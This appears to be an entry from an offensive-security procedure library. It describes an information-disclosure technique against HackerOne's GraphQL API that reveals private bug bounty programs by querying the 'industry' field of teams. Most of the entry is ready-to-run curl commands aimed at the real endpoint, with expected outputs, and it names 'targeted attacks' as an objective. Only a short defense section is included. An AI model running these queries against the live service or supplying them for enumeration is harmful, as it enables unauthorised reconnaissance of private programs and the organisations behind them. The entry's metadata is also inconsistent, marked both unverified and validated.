---
id: 123e4567-e89b-12d3-a456-426614174001
name: Query-HackerOne-GraphQL-Team-Industry
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:59.973Z'
tactics:
  - '[[Reconnaissance]]'
techniques:
  - '[[Gather Victim Org Information]]'
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - information-disclosure
  - graphql
  - api
  - reconnaissance
commands:
  - '[[commands/graphql-query-team-industry-private1]]'
  - '[[commands/graphql-query-team-industry-private2]]'
  - '[[commands/graphql-query-team-industry-public]]'
platforms:
  - Web
tools: []
skill_level: beginner
impact_level: medium
detection_risk: low
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Gather Victim Org Information]]'
  - '[[Exploit Public-Facing Application]]'
---

# Query-HackerOne-GraphQL-Team-Industry

## Summary

This procedure exploits an information disclosure vulnerability in HackerOne's GraphQL API by querying the 'industry' field of team objects using specific handles. A non-null response indicates association with private bug bounty programs, enabling unauthorized reconnaissance of program statuses across industries.

## Description

The vulnerability stems from improper access controls on the 'industry' field in the GraphQL schema. By crafting queries with known team handles (obtainable from public sources), attackers can retrieve sensitive industry details for private programs, while public or sandboxed teams return null. This allows mapping of private bug bounty initiatives without authentication. The target environment is the public HackerOne GraphQL API at https://api.hackerone.com/graphql. Prerequisites include basic HTTP knowledge and example team handles; no tools beyond curl are needed. Expected outcomes include JSON responses revealing or nulling industry data, confirming the disclosure.

## Requirements

1. Internet access to HackerOne's API endpoint
2. Knowledge of team handles (e.g., from public HackerOne directory)
3. HTTP client like curl for POST requests

## Defense

Defensive measures and detection strategies:

- Implement proper ACLs on GraphQL fields to restrict private data access
- Rate-limit API queries by IP to detect enumeration attempts
- Monitor GraphQL logs for repeated team(handle:) queries with varying handles
- Use schema introspection limits or field-level authorization in GraphQL resolvers

## Objectives

1. Retrieve 'industry' field for private teams to disclose program existence
2. Contrast with public teams to validate selective exposure
3. Gather intelligence on private bug bounty programs for targeted attacks

## Instructions

### Step 1: Prepare GraphQL Payload

**Context**: Construct the JSON payload for the team query, replacing the handle with a known value. This step sets up the request body for disclosure testing.

**Command** ([[commands/graphql-query-team-industry-base]]):
```bash
# Base payload preparation (use in curl below)
echo '{"query": "query {team(handle:\"HANDLE\"){_id,industry}}"}'
```

> Replace HANDLE with a specific team identifier. This outputs the JSON string to pipe into curl. Expected: A valid GraphQL query string.

### Step 2: Execute Query for Private Team

**Context**: Send the POST request to the API using a private team handle to observe non-null industry disclosure.

**Command** ([[commands/graphql-query-team-industry-private1]]):
```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"example-private-team1\"){_id,industry}}"}'
```

> This sends the query and returns team data. Expected output: {"data":{"team":{"_id":"...","industry":"Computer Hardware & Peripherals"}}}, indicating private program exposure.

### Step 3: Repeat for Additional Private Team

**Context**: Query another private handle to confirm consistent vulnerability and gather more data.

**Command** ([[commands/graphql-query-team-industry-private2]]):
```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"example-private-team2\"){_id,industry}}"}'
```

> Similar to Step 2; expected: Non-null industry like "Computer Software".

### Step 4: Query Public Team for Contrast

**Context**: Test a non-private handle to verify null response and differentiate program types.

**Command** ([[commands/graphql-query-team-industry-public]]):
```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"example-public-team\"){_id,industry}}"}'
```

> Expected: {"data":{"team":{"_id":"...","industry":null}}}, confirming ACL works for public teams.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]] Reconnaissance

### Techniques

- [[Gather Victim Org Information]] Gather Victim Organization Information
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- [[commands/graphql-query-team-industry-private1]]
- [[commands/graphql-query-team-industry-private2]]
- [[commands/graphql-query-team-industry-public]]

## Tools Used

- None

## Tags

- information-disclosure
- graphql
- api
- reconnaissance
